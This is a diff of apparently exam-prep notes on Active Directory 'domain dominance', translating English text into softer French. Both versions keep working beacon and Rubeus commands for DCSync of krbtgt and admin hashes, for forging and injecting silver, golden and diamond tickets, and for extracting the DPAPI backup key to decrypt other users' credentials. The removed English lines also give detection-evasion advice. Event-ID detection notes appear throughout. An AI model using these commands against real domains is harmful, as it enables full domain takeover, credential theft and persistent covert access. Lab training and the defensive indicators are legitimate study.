@@ -1,50 +1,50 @@
-# Domain Dominance
+# Domain Dominance — Contrôle du domaine
 
-> **Phase context:** Domain Dominance begins after you have obtained Domain Admin (or equivalent) privileges. The goal shifts from *gaining* access to *ensuring you keep it* — extracting secrets that let you re-authenticate as any user, to any service, indefinitely, even if your initial foothold is cleaned up.
+> **Contexte :** cette phase intervient après l’obtention de privilèges Domain Admin ou équivalents. Les notes étudient les secrets AD et les mécanismes Kerberos qui peuvent maintenir des accès même après la perte de la session initiale.
 
-> **No dedicated lab for this topic.** In the exam, these techniques apply once you've compromised a DA account (via Kerberoasting, DCSync from a compromised DC, etc.). In a multi-domain/forest environment, each domain has its own `krbtgt` — you need to DCSync per domain. Silver tickets are machine-specific. DPAPI backup keys are per-domain.
+> **Pas de lab dédié :** ces notions concernent les comptes privilégiés et les secrets de domaine. Dans une forêt contenant plusieurs domaines, chaque domaine possède son propre compte `krbtgt` et sa propre clé de sauvegarde DPAPI. Les Silver Tickets sont liés à un service et un hôte précis.
 
-**Techniques covered:**
-- [DCSync](#dcsync) — pull password hashes directly from a DC using replication protocol
-- [Silver Tickets](#silver-tickets) — forge service tickets using a machine or service account secret
-- [Golden Tickets](#golden-tickets) — forge TGTs using the `krbtgt` hash
-- [Diamond Tickets](#diamond-tickets) — modify a legitimate TGT (stealthier than golden)
-- [DPAPI Backup Key](#dpapi-backup-key) — extract domain-wide DPAPI key to decrypt all user credential blobs
+**Techniques présentées :**
+- [DCSync](#dcsync) — étudier la récupération des hashes via le protocole de réplication du DC
+- [Silver Tickets](#silver-tickets) — comprendre les tickets de service générés avec un secret de machine ou de service
+- [Golden Tickets](#golden-tickets) — étudier les TGT associés au secret du compte `krbtgt`
+- [Diamond Tickets](#diamond-tickets) — étudier la modification d’un TGT valide
+- [DPAPI Backup Key](#dpapi-backup-key) — comprendre la clé de sauvegarde DPAPI du domaine et les données qu’elle protège
 
-**Prerequisites per technique:**
+**Prérequis par technique :**
 
-| Technique | Requires | Persists until |
+| Technique | Prérequis | Validité potentielle |
 |-----------|----------|----------------|
-| DCSync | Domain Admin or DC computer account | — (one-time extraction) |
-| Silver Ticket | Target machine/service AES256 or RC4 hash | Computer password change (~30 days) |
-| Golden Ticket | `krbtgt` AES256 hash + domain SID | `krbtgt` password change (manual only) |
-| Diamond Ticket | `krbtgt` AES256 hash + valid beacon TGT | `krbtgt` password change |
-| DPAPI Backup Key | Domain Admin (to extract from DC) | Never changed automatically |
+| DCSync | Droits de réplication AD appropriés | Opération ponctuelle |
+| Silver Ticket | Secret AES256 ou RC4 du compte machine/service concerné | Modification du mot de passe du compte ordinateur |
+| Golden Ticket | Secret AES256 `krbtgt` et SID du domaine | Rotation du secret `krbtgt` |
+| Diamond Ticket | Secret AES256 `krbtgt` et TGT valide dans le lab | `krbtgt` password change |
+| DPAPI Backup Key | Permissions appropriées sur le Domain Controller | Rotation de la clé, dont la gestion doit être vérifiée |
 
 ---
 
 ## DCSync
 
-**What it is:** Mimics the Directory Replication Service (DRS) protocol that domain controllers use to sync data with each other. Instead of authenticating to LSASS on a DC, you ask the DC to *replicate* user data to you — including NTLM hashes and Kerberos keys. Pulls any account's hash without touching LSASS directly.
+**Fonctionnement :** DCSync utilise le protocole Directory Replication Service (DRS), normalement employé entre Domain Controllers. Avec les droits requis, il peut demander la réplication d’attributs sensibles, notamment des secrets d’authentification.
 
-**Why `krbtgt` is the primary target:** The `krbtgt` account's hash is used to encrypt and sign all TGTs in the domain. Possessing it lets you forge valid TGTs for any user to any service. Unlike computer account secrets (rotated every 30 days), the `krbtgt` hash is **never automatically changed** — it persists indefinitely.
+**Rôle de `krbtgt` :** ce compte protège les tickets TGT du domaine. La compromission de son secret met en danger l’authentification Kerberos. Sa rotation exige une procédure d’administration spécifique.
 
-**Requires:** Domain Admin, Enterprise Admin, or a DC computer account.
+**Prérequis :** droits de réplication AD, généralement associés aux comptes Domain Admin, Enterprise Admin ou certains comptes de service.
 
-### Extract krbtgt hash (most common — used for golden/diamond tickets)
+### Examiner le secret `krbtgt` du lab
 
 ```
 beacon> dcsync contoso.com CONTOSO\krbtgt
 ```
 
-> `OPSEC-CAUTION` — DRS replication requests originating from a non-DC IP address are anomalous and detectable.  
-> Event ID **4662** is generated when Directory Service Access auditing is enabled. The identifying GUIDs logged:
+> `OPSEC-CAUTION` — les demandes de réplication DRS issues d’un hôte non-DC peuvent constituer un indicateur de compromission.  
+> L’événement **4662** peut être généré lorsque l’audit des accès à l’annuaire est activé. Plusieurs GUID permettent de distinguer les permissions de réplication :
 > - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` → DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
 > - `89e95b76-444d-4c62-991a-0facbeda640c` → DS-Replication-Get-Changes-In-Filtered-Set
 >
-> Defenders must identify replication requests from IPs that are *not* known DCs. Pull only the account you need — avoid bulk replication (`/all`) which is far more anomalous.
+> **Surveillance :** les demandes de réplication depuis des adresses non répertoriées comme DC méritent une investigation. Les requêtes massives produisent un volume plus important.
 
-### Extract specific accounts
+### Étudier la réplication d’un compte particulier
 
 ```
 beacon> dcsync contoso.com CONTOSO\krbtgt          # for golden/diamond tickets
@@ -52,38 +52,38 @@ beacon> dcsync contoso.com CONTOSO\Administrator   # DA hash for PTH / lateral m
 beacon> dcsync contoso.com CONTOSO\<target-user>   # any user's hash on demand
 ```
 
-### Get domain SID (needed for all ticket forgery)
+### Récupérer le SID du domaine
 
 ```
 beacon> powerpick Get-DomainSID
 # also visible in DCSync output — look for "Object Security ID" field
 ```
 
-### Multi-domain / forest note
+### Particularités des forêts multidomaines
 
-> In a multi-domain forest, each child domain has its own `krbtgt`. If you have DA in `child.contoso.com`, DCSync *that domain's* `krbtgt` for tickets valid in that domain. Golden tickets from one domain are not valid in a different domain — they are bound to the domain SID and signed by that domain's `krbtgt`.
+> Dans une forêt multidomaine, chaque domaine enfant possède son propre `krbtgt`. Les tickets sont liés au SID du domaine et aux secrets Kerberos correspondants ; les secrets d’un domaine ne sont pas interchangeables entre domaines.
 
 ---
 
-## Ticket Forgery
+## Tickets Kerberos forgés
 
-**What it is:** Using stolen secrets to create Kerberos tickets *offline* (without talking to a KDC) and injecting them into a logon session. The forged ticket is cryptographically valid — the target service or DC cannot distinguish it from a legitimately issued ticket, provided the signing key is correct.
+**Principe :** les tickets forgés utilisent des secrets Kerberos compromis pour construire des tickets sans passer par le cycle normal de délivrance du KDC. Leur validation dépend des signatures, des clés et des contrôles de sécurité du domaine.
 
 ---
 
 ### Silver Tickets
 
-**What:** A forged Kerberos *service ticket* (TGS), signed with the target machine's or service account's secret. Unlike a golden ticket (which forges a TGT), a silver ticket forges the ticket for a *specific service on a specific machine*.
+**Silver Ticket :** ticket de service Kerberos (TGS) associé au secret d’un compte machine ou service précis. Contrairement au Golden Ticket, il concerne un service et un hôte déterminés.
 
-**Why useful:**
-1. **Maintain local admin access after an exploit:** If you compromised a machine via exploit and dumped its computer account hash, you can forge a CIFS ticket that gives you persistent remote file access — even if the original exploit path is patched.
-2. **Escalate via Kerberoasted service accounts:** If you crack/know the plaintext of a service account, you can forge a ticket *impersonating a sysadmin user* for that service, even if your actual credentials have no access.
+**Intérêt dans le scénario étudié :**
+1. **Persistances locales :** le secret d’un compte ordinateur compromet la confiance accordée aux tickets de services de la machine, même après correction de la vulnérabilité initiale.
+2. **Comptes de service :** la compromission d’un secret Kerberos de compte de service peut exposer les services qui dépendent de cette identité.
 
-**Downside:** Computer account secrets are automatically rotated by AD every **30 days** — silver tickets using a computer account hash expire when the hash is rotated.
+**Limite :** les comptes ordinateurs peuvent changer périodiquement leur secret, notamment selon les politiques Active Directory.
 
-#### Use Case 1 — CIFS access using computer account hash
+#### Cas 1 — Ticket CIFS lié au compte ordinateur
 
-Run on the attacker Windows machine (not in beacon):
+Commande de l’exercice à exécuter sur le poste Windows du lab, et non dans le Beacon :
 
 ```powershell
 # Forge a silver ticket for CIFS on lon-db-1, impersonating Administrator
@@ -96,17 +96,17 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
   /nowrap
 ```
 
-**Parameters:**
-- `/service` — target service and host (format: `cifs/hostname` or `http/hostname` etc.)
-- `/aes256` — AES256 hash of the **computer account** (lon-db-1$), obtained via DCSync or LSASS dump
-- `/user` — username to impersonate in the forged ticket (does not need to exist — but use a valid DA account)
-- `/domain` — FQDN of the domain
-- `/sid` — domain SID (from `Get-DomainSID` or DCSync output)
-- `/nowrap` — output ticket as single-line base64
+**Paramètres :**
+- `/service` — service cible et hôte (format : `cifs/hostname` or `http/hostname` etc.)
+- `/aes256` — secret AES256 du compte ordinateur `lon-db-1$` dans le scénario
+- `/user` — nom d’utilisateur représenté par le ticket du lab
+- `/domain` — FQDN du domaine
+- `/sid` — SID du domaine, issu de `Get-DomainSID` ou des informations de réplication
+- `/nowrap` — sortie Base64 du ticket sur une seule ligne
 
-> Rubeus defaults: user RID 500, group RIDs 520,512,513,519,518. Override with `/id:<RID>` and `/groups:<RIDs>`.
+> Valeurs par défaut indiquées pour Rubeus : RID utilisateur 500 et groupes 520, 512, 513, 519, 518. Les options `/id` et `/groups` les définissent explicitement.
 
-Inject and verify:
+Importer le ticket et vérifier son état :
 
 ```
 beacon> make_token CONTOSO\Administrator FakePass
@@ -116,13 +116,13 @@ beacon> ls \\lon-db-1\c$
 beacon> rev2self
 ```
 
-> `make_token` creates a Type 9 logon session (password is never validated). `ptt` (Pass-The-Ticket) injects the forged ticket into that session's Kerberos cache. `klist` confirms the ticket is loaded. `rev2self` drops the token when done.
+> Dans ce lab, `make_token` crée une session réseau de type 9. `ptt` importe un ticket dans le cache Kerberos ; `klist` affiche les tickets de la session et `rev2self` termine l’impersonation.
 
-#### Use Case 2 — MSSQLSvc access via Kerberoasted/plaintext service account
+#### Cas 2 — Service MSSQLSvc et compte de service
 
-When you have a service account's plaintext password (e.g. from Kerberoasting crack) but the account is not a SQL sysadmin, forge a ticket *as a user who is* sysadmin:
+Le scénario compare les permissions d’un compte de service SQL standard à celles d’un compte disposant du rôle `sysadmin`.
 
-**Step 1 — Convert plaintext password to hash:**
+**Étape 1 — Étudier la dérivation des clés depuis un mot de passe :**
 
 ```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash `
@@ -131,9 +131,9 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash `
   /password:Passw0rd!
 ```
 
-> Outputs RC4 (NTLM) and AES128/AES256 hashes. Use AES256 where possible — RC4 is more heavily monitored.
+> La sortie présente les secrets RC4 (NTLM) et AES128/AES256. Le choix de l’algorithme dépend du domaine et de ses politiques Kerberos.
 
-**Step 2 — Forge the MSSQLSvc service ticket, impersonating a sysadmin:**
+**Étape 2 — Étudier le ticket de service MSSQLSvc :**
 
 ```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
@@ -147,11 +147,11 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
   /nowrap
 ```
 
-> `/id` = rsteel's RID (obtain via `Get-DomainUser rsteel | select objectsid`).  
-> `/groups` = rsteel's group RIDs: 513 = Domain Users, 1106 = Workstation Admins, 1107 = Server Admins, 4602 = Database Admins. Match these to what SQL Server expects — the PAC group memberships are what grant the sysadmin role.  
-> Get group RIDs: `powerpick Get-DomainGroup | select name,objectsid`
+> `/id` = RID de `rsteel`, identifiable dans son `objectsid`.  
+> `/groups` = RID des groupes du lab : 513 (Domain Users), 1106 (Workstation Admins), 1107 (Server Admins), 4602 (Database Admins). Leur influence sur SQL Server dépend des groupes et rôles autorisés.  
+> Pour relever les RID des groupes : `powerpick Get-DomainGroup | select name,objectsid`
 
-Inject and use:
+Importer le ticket et examiner son usage :
 
 ```
 beacon> make_token CONTOSO\rsteel FakePass
@@ -159,26 +159,26 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /tick
 beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info
 ```
 
-#### OPSEC — Silver Tickets
+#### Indicateurs OPSEC — Silver Tickets
 
 > `OPSEC-CAUTION`  
-> **PAC validation:** If PAC validation is enabled on the target computer, the silver ticket checksum (signed with the computer's key) will be validated against the KDC — and will fail because the KDC signs PACs with its own key, not the computer's. Mitigation: if you also have the `krbtgt` hash, you can sign the PAC with it too.  
+> **Validation du PAC :** les contrôles de signature Kerberos et les mécanismes de validation renforcés peuvent révéler des tickets de service construits en dehors des échanges normaux avec le KDC.  
 >
-> **Detection via event correlation:** In a legitimate exchange, a service ticket use (Event 4624 on the target machine) is preceded by a TGS-REQ logged as Event 4769 on a DC. Forged silver tickets produce a **4624 with no preceding 4769** — a strong IoC.  
+> **Corrélation d’événements :** une connexion de type 4624 sans requête TGS-REQ (4769) correspondante peut constituer un signal à examiner, selon la configuration de journalisation.  
 >
-> **Ticket anomalies:** The Kerberos realm in the ticket should be uppercase. Some older tools output lowercase — Rubeus converts to uppercase automatically.
+> **Anomalies :** vérifier le format du realm Kerberos, notamment l’utilisation des majuscules.
 
 ---
 
 ### Golden Tickets
 
-**What:** A forged TGT signed with the `krbtgt` account's secret (AES256 hash). When injected, Windows uses it to request legitimate service tickets from the KDC via standard TGS-REQ/TGS-REP — so service ticket issuance appears legitimate.
+**Golden Ticket :** TGT construit avec le secret du compte `krbtgt`. Les tickets de service peuvent ensuite être demandés via les échanges Kerberos standards si les contrôles l’acceptent.
 
-**Why more powerful than silver tickets:** A golden ticket gives you a valid TGT. From that TGT, Windows can request service tickets for *any service* to *any host* in the domain — not just one specific service like a silver ticket. Essentially grants full DA-equivalent access without needing an account password or hash beyond `krbtgt`.
+**Différence avec Silver Ticket :** un TGT concerne l’authentification Kerberos auprès du KDC plutôt qu’un service unique. La compromission du secret `krbtgt` met donc potentiellement en danger une plus grande partie du domaine.
 
-**Persistence advantage:** The `krbtgt` hash is **never rotated automatically**. The only way to invalidate existing golden tickets is to rotate `krbtgt` twice (the current and previous version are both valid) — an operational disruption few organisations willingly perform.
+**Durée du risque :** la rotation de `krbtgt` suit une procédure d’administration spécifique. Les recommandations de remédiation prévoient généralement deux rotations espacées et contrôlées.
 
-### Forge and inject a golden ticket
+### Exemple du lab — Golden Ticket
 
 ```powershell
 # Run on attacker Windows machine
@@ -190,13 +190,13 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden `
   /nowrap
 ```
 
-**Parameters:**
-- `/aes256` — AES256 hash of `krbtgt` account (from DCSync)
-- `/user` — username to impersonate (use a real DA account name — fake names can be detected)
-- `/domain` — FQDN of the current domain
-- `/sid` — current domain SID
+**Paramètres :**
+- `/aes256` — secret AES256 de `krbtgt` dans le scénario
+- `/user` — nom du compte utilisateur représenté par le ticket
+- `/domain` — FQDN du domaine courant
+- `/sid` — SID du domaine courant
 
-Inject and verify:
+Importer le ticket et vérifier son état :
 
 ```
 beacon> make_token CONTOSO\Administrator FakePass
@@ -206,29 +206,29 @@ beacon> ls \\lon-dc-1\c$
 beacon> rev2self
 ```
 
-#### OPSEC — Golden Tickets
+#### Indicateurs OPSEC — Golden Tickets
 
 > `OPSEC-CAUTION`  
-> **Missing AS-REQ (4768):** In a normal Kerberos flow, a user's TGT is obtained via AS-REQ (Event 4768). Forged golden tickets skip this — so defenders may spot TGS-REQs (4769) from a user with no preceding 4768 from the same host.  
+> **Absence d’AS-REQ (4768) :** une demande de ticket de service (4769) sans demande préalable de TGT (4768) peut constituer une anomalie, selon l’historique et la journalisation.  
 >
-> **Mimikatz 10-year lifetime:** Mimikatz sets forged ticket lifetimes to 10 years by default. Domain policy typically sets max ticket lifetime to 10 hours, renewable for 7 days. A ticket with a 10-year lifetime is an immediate IoC. **Rubeus does not have this problem** — use Rubeus for ticket forgery, not Mimikatz's `kerberos::golden`.  
+> **Durée du ticket :** un ticket présentant une durée très éloignée de la politique Kerberos du domaine est suspect. La durée doit être comparée aux paramètres réellement configurés sur le KDC.  
 >
-> **Impersonated username:** Use a real domain user account name (e.g. Administrator). Forging tickets for fictional users leaves anomalous entries in Security logs.
+> **Nom d’utilisateur :** des incohérences entre le compte figurant dans un ticket et les objets réels de l’annuaire peuvent apparaître dans les journaux.
 
 ---
 
 ### Diamond Tickets
 
-**What:** A diamond ticket starts as a *legitimate* TGT requested from the KDC, then is decrypted using the `krbtgt` hash, modified internally (user, RID, groups), re-encrypted, and re-signed. The end result is functionally identical to a golden ticket but with much better stealth.
+**Diamond Ticket :** le scénario part d’un TGT émis par le KDC, puis examine sa modification à partir du secret `krbtgt`. Les différences principales portent sur l’origine et les métadonnées du ticket.
 
-**Why stealthier than golden tickets:**
-- The ticket's infrastructure fields (timestamps, domain policy lifetime, encryption metadata) are copied from a real KDC-issued ticket — no anomalous values.
-- The AS-REQ (Event 4768) *does* exist for the original user, making event correlation harder to detect.
-- Ticket lifetime matches domain policy exactly.
+**Différences avec un Golden Ticket :**
+- Certaines métadonnées du ticket proviennent initialement d’un TGT délivré par le KDC.
+- La requête AS-REQ (événement 4768) du ticket initial existe dans les journaux, selon les paramètres d’audit.
+- La durée du ticket d’origine suit la politique du domaine.
 
-**Requires:** `krbtgt` AES256 hash + an active beacon (for the TGT delegation trick).
+**Prérequis dans le lab :** secret AES256 `krbtgt` et session Beacon disposant d’un TGT exploitable par le scénario.
 
-### Forge a diamond ticket
+### Exemple du lab — Diamond Ticket
 
 ```
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond `
@@ -240,17 +240,17 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond `
   /nowrap
 ```
 
-**Parameters:**
-- `/tgtdeleg` — uses the Kerberos unconstrained delegation trick to obtain a usable TGT for the *current beacon user* without needing credentials. Works in any beacon session.
-- `/krbkey` — `krbtgt` AES256 hash (from DCSync)
-- `/ticketuser` — the user to impersonate in the modified ticket
-- `/ticketuserid` — the RID of the impersonated user (500 = built-in Administrator)
-- `/domain` — current domain FQDN
+**Paramètres :**
+- `/tgtdeleg` — décrit l’usage d’un TGT dans le contexte du Beacon courant.
+- `/krbkey` — secret AES256 `krbtgt` dans le lab
+- `/ticketuser` — utilisateur représenté dans le ticket du lab
+- `/ticketuserid` — RID de cet utilisateur (500 correspond à Administrator intégré)
+- `/domain` — FQDN du domaine courant
 
-> Rubeus outputs two tickets: the original (current user's TGT) and the modified diamond ticket. Use the second one.  
-> Default groups: 520,512,513,519,518. Override with `/groups:<RIDs>`.
+> Dans le lab, Rubeus produit le TGT initial et le ticket modifié ; la sortie contient donc deux éléments différents.  
+> Groupes indiqués par défaut : 520, 512, 513, 519, 518 ; option de configuration `/groups`.
 
-### Verify ticket contents before injecting
+### Vérifier les informations du ticket
 
 ```powershell
 # Describe original TGT (should show current user)
@@ -264,9 +264,9 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe `
   /ticket:doIF7[...second-ticket-snip...]kNPTQ==
 ```
 
-> `FullName` field in the ticket will still reflect the original TGT user — a minor anomaly if inspected. This is expected behaviour and a known limitation.
+> Le champ `FullName` peut encore contenir l’identité d’origine, ce qui constitue une incohérence potentiellement observable.
 
-Inject and use:
+Importer le ticket et examiner son usage :
 
 ```
 beacon> make_token CONTOSO\Administrator FakePass
@@ -276,16 +276,16 @@ beacon> ls \\lon-dc-1\c$
 beacon> rev2self
 ```
 
-#### OPSEC — Diamond Tickets
+#### Indicateurs OPSEC — Diamond Tickets
 
-> `OPSEC-SAFE` relative to golden tickets.  
-> Diamond tickets produce a genuine AS-REQ (4768) for the original user — the 4768 → 4769 event correlation that exposes golden tickets does not apply here.  
-> Ticket lifetime and domain metadata match policy exactly.  
-> **Prefer diamond tickets over golden tickets in the exam** unless you have no active beacon to perform the `/tgtdeleg` request.
+> `OPSEC-SAFE` par comparaison avec les Golden Tickets dans ces notes.  
+> Le ticket initial possède une requête AS-REQ (4768) ; la corrélation des événements peut donc différer de celle d’un Golden Ticket.  
+> Les métadonnées initiales reprennent celles du ticket émis par le KDC.  
+> **Remarque :** les notes comparent les deux types de tickets ; les risques et traces réelles dépendent des contrôles Kerberos.
 
 ---
 
-### Ticket Forgery — Exam Decision Guide
+### Tickets Kerberos forgés — Exam Decision Guide
 
 ```
 Do you need to forge a ticket for a SPECIFIC service on a SPECIFIC host?
@@ -303,62 +303,62 @@ Do you need to impersonate a sysadmin user on a SQL server you can't access dire
 
 ## DPAPI Backup Key
 
-**What DPAPI is:** The Data Protection API (DPAPI) protects secrets stored in Windows Credential Manager, browser credentials, RDP saved credentials, and more. Secrets are encrypted with a per-user AES *masterkey*, which itself is encrypted using a key derived from the user's password.
+**DPAPI :** la Data Protection API protège notamment les identifiants du Credential Manager, certaines données navigateur et les secrets liés à RDP. Les données sont chiffrées avec des clés maîtresses associées au contexte utilisateur.
 
-**The backup key problem:** When a user changes their password, the password-derived encryption key changes — making the existing masterkey unreadable. To prevent data loss, Windows also stores a copy of the masterkey encrypted with a domain-wide *backup key* held in AD. Any DA can retrieve this backup key and use it to decrypt *any user's masterkey* in the domain.
+**Clé de sauvegarde :** dans un domaine Active Directory, DPAPI utilise des mécanismes de récupération qui protègent l’accès aux clés maîtresses après certains changements de mot de passe. La clé de sauvegarde du domaine est particulièrement sensible.
 
-**Why this matters for domain dominance:** The backup key is generated once when the domain is created and **never automatically changed** (there is no supported mechanism to change it). Extracting it gives you a permanent capability to decrypt all DPAPI-protected secrets for all domain users — useful for recovering credentials long after initial access is lost.
+**Enjeu :** la compromission de la clé de sauvegarde DPAPI du domaine peut mettre en danger de nombreux secrets utilisateurs. Sa gestion et sa rotation diffèrent de celles des mots de passe classiques.
 
-### Extract the domain DPAPI backup key
+### Examiner la clé de sauvegarde DPAPI du domaine
 
-Requires a beacon running with DA privileges:
+Cette étape du lab suppose les permissions appropriées sur le domaine :
 
 ```
 beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
 ```
 
-> `OPSEC-CAUTION` — uses the BackupKey Remote Protocol to connect to a DC and retrieve the backup key. Logged as an LDAP/RPC request to the DC. Requires DA.  
-> Output is a base64-encoded PVK blob — save this securely offline. This key does not expire.
+> `OPSEC-CAUTION` — le protocole de sauvegarde DPAPI implique des échanges distants avec un DC ; leur journalisation dépend de la configuration.  
+> La sortie du lab représente une clé PVK en Base64 ; ce type de secret doit être traité comme une information hautement sensible.
 
-### Decrypt credentials using the backup key
+### Étudier le déchiffrement DPAPI avec la clé de sauvegarde
 
-**Step 1 — Confirm your beacon identity:**
+**Étape 1 — Vérifier l’identité du Beacon :**
 
 ```
 beacon> getuid
 ```
 
-> Even if you are DA, you can only decrypt credentials for users whose credential files you can access. The backup key bypasses the password-derivation step, but you still need the encrypted credential/masterkey files.
+> Les droits Domain Admin ne rendent pas automatiquement tous les fichiers accessibles. L’étude de DPAPI nécessite les fichiers de secrets et les clés correspondantes.
 
-**Step 2 — Enumerate available credential blobs (using current user's context):**
+**Étape 2 — Recenser les fichiers DPAPI accessibles :**
 
 ```
 beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
 ```
 
-> Without the backup key, SharpDPAPI can only decrypt credentials belonging to the current user (using the `/rpc` method to ask the user's own DPAPI service). For *other users* (e.g. pchilds' credentials from dyork's beacon), `/rpc` will fail — the backup key is required.
+> La disponibilité des clés DPAPI varie selon le compte, la session et les droits d’accès. La méthode `/rpc` ne remplace pas toutes les clés nécessaires pour d’autres profils utilisateurs.
 
-**Step 3 — Decrypt any user's credentials using the backup key:**
+**Étape 3 — Examiner le résultat du déchiffrement dans le lab :**
 
 ```
 beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:HvG1s[...backup-key-base64...]lXQns=
 ```
 
-> `/pvk` is the base64 backup key output from step 1.  
-> SharpDPAPI will locate and decrypt all credential blobs it can find in the current user's profile and any accessible paths. Output includes decrypted credentials (usernames, passwords, certificates).  
-> `OPSEC-CAUTION` — file access to credential store locations is logged if file access auditing is enabled.
+> L’option `/pvk` indique la clé de sauvegarde utilisée dans le scénario.  
+> SharpDPAPI traite les données DPAPI accessibles dans le profil et les chemins autorisés. Les sorties peuvent contenir des secrets d’authentification.  
+> `OPSEC-CAUTION` — les accès aux fichiers de secrets peuvent être consignés si l’audit est activé.
 
-### What DPAPI protects (high-value targets)
+### Types de données protégées par DPAPI
 
-| Credential type | Location |
+| Type de donnée | Emplacement |
 |-----------------|----------|
 | Windows Credential Manager | `%APPDATA%\Microsoft\Credentials\` |
-| Browser saved passwords | Chrome/Edge: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
-| RDP saved credentials | DPAPI-protected in Credential Manager |
+| Mots de passe enregistrés dans le navigateur | Chrome/Edge: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
+| Identifiants RDP enregistrés | DPAPI-protected in Credential Manager |
 | WiFi PSKs | `C:\ProgramData\Microsoft\Wlansvc\Profiles\` |
-| Certificate private keys | `%APPDATA%\Microsoft\Crypto\RSA\` |
+| Clés privées de certificats | `%APPDATA%\Microsoft\Crypto\RSA\` |
 
-### Multi-user credential decryption (exam scenario)
+### DPAPI et plusieurs profils utilisateurs dans le lab
 
 ```
 # From a DA beacon, enumerate a different user's credential files
@@ -371,9 +371,9 @@ SharpDPAPI.exe credentials /pvk:<backup-key-base64>
 
 ---
 
-## Exam Quick Reference
+## Aide-mémoire pour l’examen
 
-### Pre-requisite data collection (do this immediately after reaching DA)
+### Informations à vérifier dans le contexte Domain Admin
 
 ```
 # 1. Get domain SID
@@ -391,29 +391,29 @@ beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.e
 # 5. Note: save krbtgt AES256, domain SID, and backup key PVK offline
 ```
 
-### Key material cheat card
+### Récapitulatif des secrets et identifiants
 
-| Need | Tool | Source |
+| Information | Outil | Source |
 |------|------|--------|
-| Domain SID | `Get-DomainSID` or DCSync output | AD |
+| SID du domaine | `Get-DomainSID` ou résultat de DCSync | AD |
 | krbtgt AES256 | `dcsync CONTOSO\krbtgt` | DC |
-| Computer account AES256 | `dcsync CONTOSO\<machine>$` or LSASS dump | Target host |
-| Service account hash | Rubeus `hash` from plaintext, or Kerberoasting | varies |
-| User RID | `Get-DomainUser <user> \| select objectsid` | AD |
-| Group RIDs | `Get-DomainGroup \| select name,objectsid` | AD |
+| Secret AES256 du compte ordinateur | `dcsync CONTOSO\<machine>$` ou extraction LSASS dans le lab | Target host |
+| Hash d’un compte de service | Rubeus `hash` à partir du mot de passe ou d’un résultat Kerberoasting | variable |
+| RID utilisateur | `Get-DomainUser <user> \| select objectsid` | AD |
+| RID des groupes | `Get-DomainGroup \| select name,objectsid` | AD |
 
-### OPSEC tiers for this phase
+### Niveaux OPSEC de cette phase
 
-| Technique | Tier | Primary detection |
+| Technique | Niveau | Détection possible |
 |-----------|------|-------------------|
-| DCSync (targeted) | CAUTION | Event 4662 from non-DC IP |
-| Silver ticket (computer acct) | CAUTION | 4624 without prior 4769; PAC validation failure |
-| Silver ticket (service acct) | CAUTION | Same as above |
-| Golden ticket | CAUTION | Missing 4768; anomalous ticket lifetime if using Mimikatz |
-| Diamond ticket | SAFE (relative) | FullName field mismatch in ticket (minor) |
-| DPAPI backup key extraction | CAUTION | RPC call to DC; file access auditing |
+| DCSync (targeted) | CAUTION | Événement 4662 depuis une adresse non-DC |
+| Silver ticket (computer acct) | CAUTION | 4624 sans 4769 corrélé ; échec de validation PAC |
+| Silver ticket (service acct) | CAUTION | Même type de détection |
+| Golden ticket | CAUTION | 4768 manquant ou durée de ticket anormale |
+| Diamond ticket | SAFE (relative) | Incohérence du champ FullName |
+| DPAPI backup key extraction | CAUTION | Requête RPC au DC et accès aux fichiers |
 
-### Inject ticket — standard pattern (same for silver/golden/diamond)
+### Importer un ticket — schéma commun du lab
 
 ```
 beacon> make_token CONTOSO\<impersonated-user> FakePass
@@ -423,9 +423,9 @@ beacon> <access the target resource>
 beacon> rev2self
 ```
 
-> Always `rev2self` after completing the task — lingering token impersonation in a beacon session is unnecessary noise.
+> Après les vérifications du lab, `rev2self` remet le Beacon dans son contexte d’identité initial.
 
-### Rubeus commands summary
+### Récapitulatif des commandes Rubeus
 
 ```powershell
 # Silver — computer account (CIFS)
@@ -450,7 +450,7 @@ Rubeus.exe hash /user:<user> /domain:<FQDN> /password:<plaintext>
 Rubeus.exe describe /servicekey:<krbtgt-aes256> /ticket:<base64>
 ```
 
-### SharpDPAPI commands summary
+### Récapitulatif des commandes SharpDPAPI
 
 ```
 # Extract domain backup key (DA required)
